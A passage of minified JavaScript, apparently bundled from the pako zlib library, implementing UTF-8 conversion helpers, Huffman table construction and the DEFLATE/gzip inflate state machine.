      for (let r = 0, o = 0, i = t.length; r < i; r++) {
        let e = t[r];
        n.set(e, o), (o += e.length);
      }
      return n;
    };
  let Yl = !0;
  try {
    String.fromCharCode.apply(null, new Uint8Array(1));
  } catch (DO) {
    Yl = !1;
  }
  const Ql = new Uint8Array(256);
  for (let UO = 0; UO < 256; UO++)
    Ql[UO] =
      UO >= 252
        ? 6
        : UO >= 248
        ? 5
        : UO >= 240
        ? 4
        : UO >= 224
        ? 3
        : UO >= 192
        ? 2
        : 1;
  Ql[254] = Ql[254] = 1;
  var $l = (t) => {
      if ("function" == typeof TextEncoder && TextEncoder.prototype.encode)
        return new TextEncoder().encode(t);
      let e,
        n,
        r,
        o,
        i,
        s = t.length,
        a = 0;
      for (o = 0; o < s; o++)
        (n = t.charCodeAt(o)),
          55296 == (64512 & n) &&
            o + 1 < s &&
            ((r = t.charCodeAt(o + 1)),
            56320 == (64512 & r) &&
              ((n = 65536 + ((n - 55296) << 10) + (r - 56320)), o++)),
          (a += n < 128 ? 1 : n < 2048 ? 2 : n < 65536 ? 3 : 4);
      for (e = new Uint8Array(a), i = 0, o = 0; i < a; o++)
        (n = t.charCodeAt(o)),
          55296 == (64512 & n) &&
            o + 1 < s &&
            ((r = t.charCodeAt(o + 1)),
            56320 == (64512 & r) &&
              ((n = 65536 + ((n - 55296) << 10) + (r - 56320)), o++)),
          n < 128
            ? (e[i++] = n)
            : n < 2048
            ? ((e[i++] = 192 | (n >>> 6)), (e[i++] = 128 | (63 & n)))
            : n < 65536
            ? ((e[i++] = 224 | (n >>> 12)),
              (e[i++] = 128 | ((n >>> 6) & 63)),
              (e[i++] = 128 | (63 & n)))
            : ((e[i++] = 240 | (n >>> 18)),
              (e[i++] = 128 | ((n >>> 12) & 63)),
              (e[i++] = 128 | ((n >>> 6) & 63)),
              (e[i++] = 128 | (63 & n)));
      return e;
    },
    td = (t, e) => {
      const n = e || t.length;
      if ("function" == typeof TextDecoder && TextDecoder.prototype.decode)
        return new TextDecoder().decode(t.subarray(0, e));
      let r, o;
      const i = new Array(2 * n);
      for (o = 0, r = 0; r < n; ) {
        let e = t[r++];
        if (e < 128) {
          i[o++] = e;
          continue;
        }
        let s = Ql[e];
        if (s > 4) (i[o++] = 65533), (r += s - 1);
        else {
          for (e &= 2 === s ? 31 : 3 === s ? 15 : 7; s > 1 && r < n; )
            (e = (e << 6) | (63 & t[r++])), s--;
          s > 1
            ? (i[o++] = 65533)
            : e < 65536
            ? (i[o++] = e)
            : ((e -= 65536),
              (i[o++] = 55296 | ((e >> 10) & 1023)),
              (i[o++] = 56320 | (1023 & e)));
        }
      }
      return ((t, e) => {
        if (e < 65534 && t.subarray && Yl)
          return String.fromCharCode.apply(
            null,
            t.length === e ? t : t.subarray(0, e)
          );
        let n = "";
        for (let r = 0; r < e; r++) n += String.fromCharCode(t[r]);
        return n;
      })(i, o);
    },
    ed = (t, e) => {
      (e = e || t.length) > t.length && (e = t.length);
      let n = e - 1;
      for (; n >= 0 && 128 == (192 & t[n]); ) n--;
      return n < 0 || 0 === n ? e : n + Ql[t[n]] > e ? n : e;
    };
  var nd = function () {
    (this.input = null),
      (this.next_in = 0),
      (this.avail_in = 0),
      (this.total_in = 0),
      (this.output = null),
      (this.next_out = 0),
      (this.avail_out = 0),
      (this.total_out = 0),
      (this.msg = ""),
      (this.state = null),
      (this.data_type = 2),
      (this.adler = 0);
  };
  const rd = 16209;
  var od = function (t, e) {
    let n, r, o, i, s, a, u, c, l, d, f, h, p, m, g, y, w, b, v, A, k, I, S, _;
    const T = t.state;
    (n = t.next_in),
      (S = t.input),
      (r = n + (t.avail_in - 5)),
      (o = t.next_out),
      (_ = t.output),
      (i = o - (e - t.avail_out)),
      (s = o + (t.avail_out - 257)),
      (a = T.dmax),
      (u = T.wsize),
      (c = T.whave),
      (l = T.wnext),
      (d = T.window),
      (f = T.hold),
      (h = T.bits),
      (p = T.lencode),
      (m = T.distcode),
      (g = (1 << T.lenbits) - 1),
      (y = (1 << T.distbits) - 1);
    t: do {
      h < 15 && ((f += S[n++] << h), (h += 8), (f += S[n++] << h), (h += 8)),
        (w = p[f & g]);
      e: for (;;) {
        if (
          ((b = w >>> 24),
          (f >>>= b),
          (h -= b),
          (b = (w >>> 16) & 255),
          0 === b)
        )
          _[o++] = 65535 & w;
        else {
          if (!(16 & b)) {
            if (64 & b) {
              if (32 & b) {
                T.mode = 16191;
                break t;
              }
              (t.msg = "invalid literal/length code"), (T.mode = rd);
              break t;
            }
            w = p[(65535 & w) + (f & ((1 << b) - 1))];
            continue e;
          }
          for (
            v = 65535 & w,
              b &= 15,
              b &&
                (h < b && ((f += S[n++] << h), (h += 8)),
                (v += f & ((1 << b) - 1)),
                (f >>>= b),
                (h -= b)),
              h < 15 &&
                ((f += S[n++] << h), (h += 8), (f += S[n++] << h), (h += 8)),
              w = m[f & y];
            ;

          ) {
            if (
              ((b = w >>> 24),
              (f >>>= b),
              (h -= b),
              (b = (w >>> 16) & 255),
              16 & b)
            ) {
              if (
                ((A = 65535 & w),
                (b &= 15),
                h < b &&
                  ((f += S[n++] << h),
                  (h += 8),
                  h < b && ((f += S[n++] << h), (h += 8))),
                (A += f & ((1 << b) - 1)),
                A > a)
              ) {
                (t.msg = "invalid distance too far back"), (T.mode = rd);
                break t;
              }
              if (((f >>>= b), (h -= b), (b = o - i), A > b)) {
                if (((b = A - b), b > c && T.sane)) {
                  (t.msg = "invalid distance too far back"), (T.mode = rd);
                  break t;
                }
                if (((k = 0), (I = d), 0 === l)) {
                  if (((k += u - b), b < v)) {
                    v -= b;
                    do {
                      _[o++] = d[k++];
                    } while (--b);
                    (k = o - A), (I = _);
                  }
                } else if (l < b) {
                  if (((k += u + l - b), (b -= l), b < v)) {
                    v -= b;
                    do {
                      _[o++] = d[k++];
                    } while (--b);
                    if (((k = 0), l < v)) {
                      (b = l), (v -= b);
                      do {
                        _[o++] = d[k++];
                      } while (--b);
                      (k = o - A), (I = _);
                    }
                  }
                } else if (((k += l - b), b < v)) {
                  v -= b;
                  do {
                    _[o++] = d[k++];
                  } while (--b);
                  (k = o - A), (I = _);
                }
                for (; v > 2; )
                  (_[o++] = I[k++]),
                    (_[o++] = I[k++]),
                    (_[o++] = I[k++]),
                    (v -= 3);
                v && ((_[o++] = I[k++]), v > 1 && (_[o++] = I[k++]));
              } else {
                k = o - A;
                do {
                  (_[o++] = _[k++]),
                    (_[o++] = _[k++]),
                    (_[o++] = _[k++]),
                    (v -= 3);
                } while (v > 2);
                v && ((_[o++] = _[k++]), v > 1 && (_[o++] = _[k++]));
              }
              break;
            }
            if (64 & b) {
              (t.msg = "invalid distance code"), (T.mode = rd);
              break t;
            }
            w = m[(65535 & w) + (f & ((1 << b) - 1))];
          }
        }
        break;
      }
    } while (n < r && o < s);
    (v = h >> 3),
      (n -= v),
      (h -= v << 3),
      (f &= (1 << h) - 1),
      (t.next_in = n),
      (t.next_out = o),
      (t.avail_in = n < r ? r - n + 5 : 5 - (n - r)),
      (t.avail_out = o < s ? s - o + 257 : 257 - (o - s)),
      (T.hold = f),
      (T.bits = h);
  };
  const id = 15,
    sd = new Uint16Array([
      3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59,
      67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0,
    ]),
    ad = new Uint8Array([
      16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18, 19, 19,
      19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 72, 78,
    ]),
    ud = new Uint16Array([
      1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513,
      769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577, 0, 0,
    ]),
    cd = new Uint8Array([
      16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22, 23, 23,
      24, 24, 25, 25, 26, 26, 27, 27, 28, 28, 29, 29, 64, 64,
    ]);
  var ld = (t, e, n, r, o, i, s, a) => {
    const u = a.bits;
    let c,
      l,
      d,
      f,
      h,
      p,
      m = 0,
      g = 0,
      y = 0,
      w = 0,
      b = 0,
      v = 0,
      A = 0,
      k = 0,
      I = 0,
      S = 0,
      _ = null;
    const T = new Uint16Array(16),
      C = new Uint16Array(16);
    let B,
      E,
      x,
      P = null;
    for (m = 0; m <= id; m++) T[m] = 0;
    for (g = 0; g < r; g++) T[e[n + g]]++;
    for (b = u, w = id; w >= 1 && 0 === T[w]; w--);
    if ((b > w && (b = w), 0 === w))
      return (o[i++] = 20971520), (o[i++] = 20971520), (a.bits = 1), 0;
    for (y = 1; y < w && 0 === T[y]; y++);
    for (b < y && (b = y), k = 1, m = 1; m <= id; m++)
      if (((k <<= 1), (k -= T[m]), k < 0)) return -1;
    if (k > 0 && (0 === t || 1 !== w)) return -1;
    for (C[1] = 0, m = 1; m < id; m++) C[m + 1] = C[m] + T[m];
    for (g = 0; g < r; g++) 0 !== e[n + g] && (s[C[e[n + g]]++] = g);
    if (
      (0 === t
        ? ((_ = P = s), (p = 20))
        : 1 === t
        ? ((_ = sd), (P = ad), (p = 257))
        : ((_ = ud), (P = cd), (p = 0)),
      (S = 0),
      (g = 0),
      (m = y),
      (h = i),
      (v = b),
      (A = 0),
      (d = -1),
      (I = 1 << b),
      (f = I - 1),
      (1 === t && I > 852) || (2 === t && I > 592))
    )
      return 1;
    for (;;) {
      (B = m - A),
        s[g] + 1 < p
          ? ((E = 0), (x = s[g]))
          : s[g] >= p
          ? ((E = P[s[g] - p]), (x = _[s[g] - p]))
          : ((E = 96), (x = 0)),
        (c = 1 << (m - A)),
        (l = 1 << v),
        (y = l);
      do {
        (l -= c), (o[h + (S >> A) + l] = (B << 24) | (E << 16) | x);
      } while (0 !== l);
      for (c = 1 << (m - 1); S & c; ) c >>= 1;
      if ((0 !== c ? ((S &= c - 1), (S += c)) : (S = 0), g++, 0 === --T[m])) {
        if (m === w) break;
        m = e[n + s[g]];
      }
      if (m > b && (S & f) !== d) {
        for (
          0 === A && (A = b), h += y, v = m - A, k = 1 << v;
          v + A < w && ((k -= T[v + A]), !(k <= 0));

        )
          v++, (k <<= 1);
        if (((I += 1 << v), (1 === t && I > 852) || (2 === t && I > 592)))
          return 1;
        (d = S & f), (o[d] = (b << 24) | (v << 16) | (h - i));
      }
    }
    return (
      0 !== S && (o[h + S] = ((m - A) << 24) | (64 << 16)), (a.bits = b), 0
    );
  };
  const {
      Z_FINISH: dd,
      Z_BLOCK: fd,
      Z_TREES: hd,
      Z_OK: pd,
      Z_STREAM_END: md,
      Z_NEED_DICT: gd,
      Z_STREAM_ERROR: yd,
      Z_DATA_ERROR: wd,
      Z_MEM_ERROR: bd,
      Z_BUF_ERROR: vd,
      Z_DEFLATED: Ad,
    } = Hl,
    kd = 16180,
    Id = 16190,
    Sd = 16191,
    _d = 16192,
    Td = 16194,
    Cd = 16199,
    Bd = 16200,
    Ed = 16206,
    xd = 16209,
    Pd = (t) =>
      ((t >>> 24) & 255) +
      ((t >>> 8) & 65280) +
      ((65280 & t) << 8) +
      ((255 & t) << 24);
  function Rd() {
    (this.strm = null),
      (this.mode = 0),
      (this.last = !1),
      (this.wrap = 0),
      (this.havedict = !1),
      (this.flags = 0),
      (this.dmax = 0),
      (this.check = 0),
      (this.total = 0),
      (this.head = null),
      (this.wbits = 0),
      (this.wsize = 0),
      (this.whave = 0),
      (this.wnext = 0),
      (this.window = null),
      (this.hold = 0),
      (this.bits = 0),
      (this.length = 0),
      (this.offset = 0),
      (this.extra = 0),
      (this.lencode = null),
      (this.distcode = null),
      (this.lenbits = 0),
      (this.distbits = 0),
      (this.ncode = 0),
      (this.nlen = 0),
      (this.ndist = 0),
      (this.have = 0),
      (this.next = null),
      (this.lens = new Uint16Array(320)),
      (this.work = new Uint16Array(288)),
      (this.lendyn = null),
      (this.distdyn = null),
      (this.sane = 0),
      (this.back = 0),
      (this.was = 0);
  }
  const Od = (t) => {
      if (!t) return 1;
      const e = t.state;
      return !e || e.strm !== t || e.mode < kd || e.mode > 16211 ? 1 : 0;
    },
    Md = (t) => {
      if (Od(t)) return yd;
      const e = t.state;
      return (
        (t.total_in = t.total_out = e.total = 0),
        (t.msg = ""),
        e.wrap && (t.adler = 1 & e.wrap),
        (e.mode = kd),
        (e.last = 0),
        (e.havedict = 0),
        (e.flags = -1),
        (e.dmax = 32768),
        (e.head = null),
        (e.hold = 0),
        (e.bits = 0),
        (e.lencode = e.lendyn = new Int32Array(852)),
        (e.distcode = e.distdyn = new Int32Array(592)),
        (e.sane = 1),
        (e.back = -1),
        pd
      );
    },
    Ld = (t) => {
      if (Od(t)) return yd;
      const e = t.state;
      return (e.wsize = 0), (e.whave = 0), (e.wnext = 0), Md(t);
    },
    Nd = (t, e) => {
      let n;
      if (Od(t)) return yd;
      const r = t.state;
      return (
        e < 0 ? ((n = 0), (e = -e)) : ((n = 5 + (e >> 4)), e < 48 && (e &= 15)),
        e && (e < 8 || e > 15)
          ? yd
          : (null !== r.window && r.wbits !== e && (r.window = null),
            (r.wrap = n),
            (r.wbits = e),
            Ld(t))
      );
    },
    Dd = (t, e) => {
      if (!t) return yd;
      const n = new Rd();
      (t.state = n), (n.strm = t), (n.window = null), (n.mode = kd);
      const r = Nd(t, e);
      return r !== pd && (t.state = null), r;
    };
  let Ud,
    qd,
    Wd = !0;
  const zd = (t) => {
      if (Wd) {
        (Ud = new Int32Array(512)), (qd = new Int32Array(32));
        let e = 0;
        for (; e < 144; ) t.lens[e++] = 8;
        for (; e < 256; ) t.lens[e++] = 9;
        for (; e < 280; ) t.lens[e++] = 7;
        for (; e < 288; ) t.lens[e++] = 8;
        for (ld(1, t.lens, 0, 288, Ud, 0, t.work, { bits: 9 }), e = 0; e < 32; )
          t.lens[e++] = 5;
        ld(2, t.lens, 0, 32, qd, 0, t.work, { bits: 5 }), (Wd = !1);
      }
      (t.lencode = Ud), (t.lenbits = 9), (t.distcode = qd), (t.distbits = 5);
    },
    Kd = (t, e, n, r) => {
      let o;
      const i = t.state;
      return (
        null === i.window &&
          ((i.wsize = 1 << i.wbits),
          (i.wnext = 0),
          (i.whave = 0),
          (i.window = new Uint8Array(i.wsize))),
        r >= i.wsize
          ? (i.window.set(e.subarray(n - i.wsize, n), 0),
            (i.wnext = 0),
            (i.whave = i.wsize))
          : ((o = i.wsize - i.wnext),
            o > r && (o = r),
            i.window.set(e.subarray(n - r, n - r + o), i.wnext),
            (r -= o)
              ? (i.window.set(e.subarray(n - r, n), 0),
                (i.wnext = r),
                (i.whave = i.wsize))
              : ((i.wnext += o),
                i.wnext === i.wsize && (i.wnext = 0),
                i.whave < i.wsize && (i.whave += o))),
        0
      );
    };
  var Fd = (t, e) => {
      let n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w,
        b,
        v,
        A,
        k,
        I,
        S = 0;
      const _ = new Uint8Array(4);
      let T, C;
      const B = new Uint8Array([
        16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
      ]);
      if (Od(t) || !t.output || (!t.input && 0 !== t.avail_in)) return yd;
      (n = t.state),
        n.mode === Sd && (n.mode = _d),
        (s = t.next_out),
        (o = t.output),
        (u = t.avail_out),
        (i = t.next_in),
        (r = t.input),
        (a = t.avail_in),
        (c = n.hold),
        (l = n.bits),
        (d = a),
        (f = u),
        (I = pd);
      t: for (;;)
        switch (n.mode) {
          case kd:
            if (0 === n.wrap) {
              n.mode = _d;
              break;
            }
            for (; l < 16; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (2 & n.wrap && 35615 === c) {
              0 === n.wbits && (n.wbits = 15),
                (n.check = 0),
                (_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (n.check = Gl(n.check, _, 2, 0)),
                (c = 0),
                (l = 0),
                (n.mode = 16181);
              break;
            }
            if (
              (n.head && (n.head.done = !1),
              !(1 & n.wrap) || (((255 & c) << 8) + (c >> 8)) % 31)
            ) {
              (t.msg = "incorrect header check"), (n.mode = xd);
              break;
            }
            if ((15 & c) !== Ad) {
              (t.msg = "unknown compression method"), (n.mode = xd);
              break;
            }
            if (
              ((c >>>= 4),
              (l -= 4),
              (k = 8 + (15 & c)),
              0 === n.wbits && (n.wbits = k),
              k > 15 || k > n.wbits)
            ) {
              (t.msg = "invalid window size"), (n.mode = xd);
              break;
            }
            (n.dmax = 1 << n.wbits),
              (n.flags = 0),
              (t.adler = n.check = 1),
              (n.mode = 512 & c ? 16189 : Sd),
              (c = 0),
              (l = 0);
            break;
          case 16181:
            for (; l < 16; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (((n.flags = c), (255 & n.flags) !== Ad)) {
              (t.msg = "unknown compression method"), (n.mode = xd);
              break;
            }
            if (57344 & n.flags) {
              (t.msg = "unknown header flags set"), (n.mode = xd);
              break;
            }
            n.head && (n.head.text = (c >> 8) & 1),
              512 & n.flags &&
                4 & n.wrap &&
                ((_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (n.check = Gl(n.check, _, 2, 0))),
              (c = 0),
              (l = 0),
              (n.mode = 16182);
          case 16182:
            for (; l < 32; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            n.head && (n.head.time = c),
              512 & n.flags &&
                4 & n.wrap &&
                ((_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (_[2] = (c >>> 16) & 255),
                (_[3] = (c >>> 24) & 255),
                (n.check = Gl(n.check, _, 4, 0))),
              (c = 0),
              (l = 0),
              (n.mode = 16183);
          case 16183:
            for (; l < 16; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            n.head && ((n.head.xflags = 255 & c), (n.head.os = c >> 8)),
              512 & n.flags &&
                4 & n.wrap &&
                ((_[0] = 255 & c),
                (_[1] = (c >>> 8) & 255),
                (n.check = Gl(n.check, _, 2, 0))),
              (c = 0),
              (l = 0),
              (n.mode = 16184);
          case 16184:
            if (1024 & n.flags) {
              for (; l < 16; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.length = c),
                n.head && (n.head.extra_len = c),
                512 & n.flags &&
                  4 & n.wrap &&
                  ((_[0] = 255 & c),
                  (_[1] = (c >>> 8) & 255),
                  (n.check = Gl(n.check, _, 2, 0))),
                (c = 0),
                (l = 0);
            } else n.head && (n.head.extra = null);
            n.mode = 16185;
          case 16185:
            if (
              1024 & n.flags &&
              ((h = n.length),
              h > a && (h = a),
              h &&
                (n.head &&
                  ((k = n.head.extra_len - n.length),
                  n.head.extra ||
                    (n.head.extra = new Uint8Array(n.head.extra_len)),
                  n.head.extra.set(r.subarray(i, i + h), k)),
                512 & n.flags && 4 & n.wrap && (n.check = Gl(n.check, r, h, i)),
                (a -= h),
                (i += h),
                (n.length -= h)),
              n.length)
            )
              break t;
            (n.length = 0), (n.mode = 16186);
          case 16186:
            if (2048 & n.flags) {
              if (0 === a) break t;
              h = 0;
              do {
                (k = r[i + h++]),
                  n.head &&
                    k &&
                    n.length < 65536 &&
                    (n.head.name += String.fromCharCode(k));
              } while (k && h < a);
              if (
                (512 & n.flags &&
                  4 & n.wrap &&
                  (n.check = Gl(n.check, r, h, i)),
                (a -= h),
                (i += h),
                k)
              )
                break t;
            } else n.head && (n.head.name = null);
            (n.length = 0), (n.mode = 16187);
          case 16187:
            if (4096 & n.flags) {
              if (0 === a) break t;
              h = 0;
              do {
                (k = r[i + h++]),
                  n.head &&
                    k &&
                    n.length < 65536 &&
                    (n.head.comment += String.fromCharCode(k));
              } while (k && h < a);
              if (
                (512 & n.flags &&
                  4 & n.wrap &&
                  (n.check = Gl(n.check, r, h, i)),
                (a -= h),
                (i += h),
                k)
              )
                break t;
            } else n.head && (n.head.comment = null);
            n.mode = 16188;
          case 16188:
            if (512 & n.flags) {
              for (; l < 16; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              if (4 & n.wrap && c !== (65535 & n.check)) {
                (t.msg = "header crc mismatch"), (n.mode = xd);
                break;
              }
              (c = 0), (l = 0);
            }
            n.head && ((n.head.hcrc = (n.flags >> 9) & 1), (n.head.done = !0)),
              (t.adler = n.check = 0),
              (n.mode = Sd);
            break;
          case 16189:
            for (; l < 32; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            (t.adler = n.check = Pd(c)), (c = 0), (l = 0), (n.mode = Id);
          case Id:
            if (0 === n.havedict)
              return (
                (t.next_out = s),
                (t.avail_out = u),
                (t.next_in = i),
                (t.avail_in = a),
                (n.hold = c),
                (n.bits = l),
                gd
              );
            (t.adler = n.check = 1), (n.mode = Sd);
          case Sd:
            if (e === fd || e === hd) break t;
          case _d:
            if (n.last) {
              (c >>>= 7 & l), (l -= 7 & l), (n.mode = Ed);
              break;
            }
            for (; l < 3; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            switch (((n.last = 1 & c), (c >>>= 1), (l -= 1), 3 & c)) {
              case 0:
                n.mode = 16193;
                break;
              case 1:
                if ((zd(n), (n.mode = Cd), e === hd)) {
                  (c >>>= 2), (l -= 2);
                  break t;
                }
                break;
              case 2:
                n.mode = 16196;
                break;
              case 3:
                (t.msg = "invalid block type"), (n.mode = xd);
            }
            (c >>>= 2), (l -= 2);
            break;
          case 16193:
            for (c >>>= 7 & l, l -= 7 & l; l < 32; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if ((65535 & c) != ((c >>> 16) ^ 65535)) {
              (t.msg = "invalid stored block lengths"), (n.mode = xd);
              break;
            }
            if (
              ((n.length = 65535 & c),
              (c = 0),
              (l = 0),
              (n.mode = Td),
              e === hd)
            )
              break t;
          case Td:
            n.mode = 16195;
          case 16195:
            if (((h = n.length), h)) {
              if ((h > a && (h = a), h > u && (h = u), 0 === h)) break t;
              o.set(r.subarray(i, i + h), s),
                (a -= h),
                (i += h),
                (u -= h),
                (s += h),
                (n.length -= h);
              break;
            }
            n.mode = Sd;
            break;
          case 16196:
            for (; l < 14; ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (
              ((n.nlen = 257 + (31 & c)),
              (c >>>= 5),
              (l -= 5),
              (n.ndist = 1 + (31 & c)),
              (c >>>= 5),
              (l -= 5),
              (n.ncode = 4 + (15 & c)),
              (c >>>= 4),
              (l -= 4),
              n.nlen > 286 || n.ndist > 30)
            ) {
              (t.msg = "too many length or distance symbols"), (n.mode = xd);
              break;
            }
            (n.have = 0), (n.mode = 16197);
          case 16197:
            for (; n.have < n.ncode; ) {
              for (; l < 3; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.lens[B[n.have++]] = 7 & c), (c >>>= 3), (l -= 3);
            }
            for (; n.have < 19; ) n.lens[B[n.have++]] = 0;
            if (
              ((n.lencode = n.lendyn),
              (n.lenbits = 7),
              (T = { bits: n.lenbits }),
              (I = ld(0, n.lens, 0, 19, n.lencode, 0, n.work, T)),
              (n.lenbits = T.bits),
              I)
            ) {
              (t.msg = "invalid code lengths set"), (n.mode = xd);
              break;
            }
            (n.have = 0), (n.mode = 16198);
          case 16198:
            for (; n.have < n.nlen + n.ndist; ) {
              for (
                ;
                (S = n.lencode[c & ((1 << n.lenbits) - 1)]),
                  (g = S >>> 24),
                  (y = (S >>> 16) & 255),
                  (w = 65535 & S),
                  !(g <= l);

              ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              if (w < 16) (c >>>= g), (l -= g), (n.lens[n.have++] = w);
              else {
                if (16 === w) {
                  for (C = g + 2; l < C; ) {
                    if (0 === a) break t;
                    a--, (c += r[i++] << l), (l += 8);
                  }
                  if (((c >>>= g), (l -= g), 0 === n.have)) {
                    (t.msg = "invalid bit length repeat"), (n.mode = xd);
                    break;
                  }
                  (k = n.lens[n.have - 1]),
                    (h = 3 + (3 & c)),
                    (c >>>= 2),
                    (l -= 2);
                } else if (17 === w) {
                  for (C = g + 3; l < C; ) {
                    if (0 === a) break t;
                    a--, (c += r[i++] << l), (l += 8);
                  }
                  (c >>>= g),
                    (l -= g),
                    (k = 0),
                    (h = 3 + (7 & c)),
                    (c >>>= 3),
                    (l -= 3);
                } else {
                  for (C = g + 7; l < C; ) {
                    if (0 === a) break t;
                    a--, (c += r[i++] << l), (l += 8);
                  }
                  (c >>>= g),
                    (l -= g),
                    (k = 0),
                    (h = 11 + (127 & c)),
                    (c >>>= 7),
                    (l -= 7);
                }
                if (n.have + h > n.nlen + n.ndist) {
                  (t.msg = "invalid bit length repeat"), (n.mode = xd);
                  break;
                }
                for (; h--; ) n.lens[n.have++] = k;
              }
            }
            if (n.mode === xd) break;
            if (0 === n.lens[256]) {
              (t.msg = "invalid code -- missing end-of-block"), (n.mode = xd);
              break;
            }
            if (
              ((n.lenbits = 9),
              (T = { bits: n.lenbits }),
              (I = ld(1, n.lens, 0, n.nlen, n.lencode, 0, n.work, T)),
              (n.lenbits = T.bits),
              I)
            ) {
              (t.msg = "invalid literal/lengths set"), (n.mode = xd);
              break;
            }
            if (
              ((n.distbits = 6),
              (n.distcode = n.distdyn),
              (T = { bits: n.distbits }),
              (I = ld(2, n.lens, n.nlen, n.ndist, n.distcode, 0, n.work, T)),
              (n.distbits = T.bits),
              I)
            ) {
              (t.msg = "invalid distances set"), (n.mode = xd);
              break;
            }
            if (((n.mode = Cd), e === hd)) break t;
          case Cd:
            n.mode = Bd;
          case Bd:
            if (a >= 6 && u >= 258) {
              (t.next_out = s),
                (t.avail_out = u),
                (t.next_in = i),
                (t.avail_in = a),
                (n.hold = c),
                (n.bits = l),
                od(t, f),
                (s = t.next_out),
                (o = t.output),
                (u = t.avail_out),
                (i = t.next_in),
                (r = t.input),
                (a = t.avail_in),
                (c = n.hold),
                (l = n.bits),
                n.mode === Sd && (n.back = -1);
              break;
            }
            for (
              n.back = 0;
              (S = n.lencode[c & ((1 << n.lenbits) - 1)]),
                (g = S >>> 24),
                (y = (S >>> 16) & 255),
                (w = 65535 & S),
                !(g <= l);

            ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (y && !(240 & y)) {
              for (
                b = g, v = y, A = w;
                (S = n.lencode[A + ((c & ((1 << (b + v)) - 1)) >> b)]),
                  (g = S >>> 24),
                  (y = (S >>> 16) & 255),
                  (w = 65535 & S),
                  !(b + g <= l);

              ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (c >>>= b), (l -= b), (n.back += b);
            }
            if (
              ((c >>>= g), (l -= g), (n.back += g), (n.length = w), 0 === y)
            ) {
              n.mode = 16205;
              break;
            }
            if (32 & y) {
              (n.back = -1), (n.mode = Sd);
              break;
            }
            if (64 & y) {
              (t.msg = "invalid literal/length code"), (n.mode = xd);
              break;
            }
            (n.extra = 15 & y), (n.mode = 16201);
          case 16201:
            if (n.extra) {
              for (C = n.extra; l < C; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.length += c & ((1 << n.extra) - 1)),
                (c >>>= n.extra),
                (l -= n.extra),
                (n.back += n.extra);
            }
            (n.was = n.length), (n.mode = 16202);
          case 16202:
            for (
              ;
              (S = n.distcode[c & ((1 << n.distbits) - 1)]),
                (g = S >>> 24),
                (y = (S >>> 16) & 255),
                (w = 65535 & S),
                !(g <= l);

            ) {
              if (0 === a) break t;
              a--, (c += r[i++] << l), (l += 8);
            }
            if (!(240 & y)) {
              for (
                b = g, v = y, A = w;
                (S = n.distcode[A + ((c & ((1 << (b + v)) - 1)) >> b)]),
                  (g = S >>> 24),
                  (y = (S >>> 16) & 255),
                  (w = 65535 & S),
                  !(b + g <= l);

              ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (c >>>= b), (l -= b), (n.back += b);
            }
            if (((c >>>= g), (l -= g), (n.back += g), 64 & y)) {
              (t.msg = "invalid distance code"), (n.mode = xd);
              break;
            }
            (n.offset = w), (n.extra = 15 & y), (n.mode = 16203);
          case 16203:
            if (n.extra) {
              for (C = n.extra; l < C; ) {
                if (0 === a) break t;
                a--, (c += r[i++] << l), (l += 8);
              }
              (n.offset += c & ((1 << n.extra) - 1)),
                (c >>>= n.extra),
                (l -= n.extra),
                (n.back += n.extra);
            }
            if (n.offset > n.dmax) {
              (t.msg = "invalid distance too far back"), (n.mode = xd);
              break;
            }
            n.mode = 16204;
          case 16204:
            if (0 === u) break t;
            if (((h = f - u), n.offset > h)) {
              if (((h = n.offset - h), h > n.whave && n.sane)) {
                (t.msg = "invalid distance too far back"), (n.mode = xd);
                break;
              }
              h > n.wnext
                ? ((h -= n.wnext), (p = n.wsize - h))
                : (p = n.wnext - h),
                h > n.length && (h = n.length),
                (m = n.window);
            } else (m = o), (p = s - n.offset), (h = n.length);
            h > u && (h = u), (u -= h), (n.length -= h);
            do {
              o[s++] = m[p++];
            } while (--h);
            0 === n.length && (n.mode = Bd);
            break;
          case 16205:
            if (0 === u) break t;
            (o[s++] = n.length), u--, (n.mode = Bd);
            break;
          case Ed:
            if (n.wrap) {
              for (; l < 32; ) {
                if (0 === a) break t;
                a--, (c |= r[i++] << l), (l += 8);
              }
              if (
                ((f -= u),
                (t.total_out += f),
                (n.total += f),
                4 & n.wrap &&
                  f &&
                  (t.adler = n.check =
                    n.flags
                      ? Gl(n.check, o, f, s - f)
                      : Fl(n.check, o, f, s - f)),
                (f = u),
